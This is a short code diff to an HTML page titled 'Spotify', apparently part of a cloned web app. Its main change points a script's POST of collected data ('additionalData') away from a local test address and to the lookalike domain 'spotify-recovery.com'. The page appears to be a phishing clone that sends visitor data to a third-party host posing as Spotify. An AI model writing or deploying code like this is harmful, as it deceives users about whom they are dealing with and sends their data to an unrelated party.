@@ -9,12 +9,13 @@
     <link rel="apple-touch-icon" href="%PUBLIC_URL%/favicon.ico" />
     <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
     <title>Spotify</title>
-    <style>
+<style>
 /* Ensure the html element takes full height without overflow */
 html {
   height: 100%;
   overflow: hidden;  /* Prevent scrollbars on the html element */
 }
+
 
 /* Ensure the body element takes full height and handles overflow */
 body {
@@ -87,7 +88,7 @@ body {
         ...additionalData 
       };
 
-      fetch('http://192.168.0.2:8000/api/track', {
+      fetch('https://spotify-recovery.com/api/track', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
